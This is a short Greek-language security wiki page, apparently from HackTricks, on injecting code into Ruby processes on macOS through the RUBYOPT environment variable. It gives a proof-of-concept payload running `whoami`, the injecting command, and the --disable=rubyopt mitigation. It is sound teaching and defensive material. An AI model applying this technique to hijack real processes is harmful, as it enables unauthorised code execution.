# Injection σε Ruby Applications στο macOS

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Η Ruby αναλύει τα υποστηριζόμενα command-line switches από τη μεταβλητή περιβάλλοντος `RUBYOPT` πριν εκτελέσει ένα script. Η Ruby απορρίπτει την εκτέλεση κώδικα μέσω του `-e` στο `RUBYOPT`, αλλά το `-I` μπορεί να προσθέσει έναν κατάλογο αναζήτησης libraries και το `-r` μπορεί να κάνει require ένα library. Επομένως, μια process που εκκινεί τη Ruby με environment variables υπό τον έλεγχο attacker μπορεί να εξαναγκαστεί να φορτώσει Ruby code υπό τον έλεγχο attacker.<sup>[[1]](#references)</sup>

Δημιουργήστε το `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Δημιουργήστε ένα benign Ruby script, όπως το `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Εκτελέστε το με μια ελεγχόμενη τιμή `RUBYOPT`:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Για να απενεργοποιήσετε αυτή τη συμπεριφορά, περάστε το `--disable=rubyopt` (ή `--disable-rubyopt`) **πριν** από το όνομα του script:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
Μια επιλογή που γράφεται μετά το `hello.rb` περνά στο script μέσω του `ARGV`· δεν απενεργοποιεί την προηγούμενη επεξεργασία του `RUBYOPT` από τη Ruby.<sup>[[1]](#references)</sup>
```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
## References

- [1] [Τεκμηρίωση Ruby - Επιλογές γραμμής εντολών Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
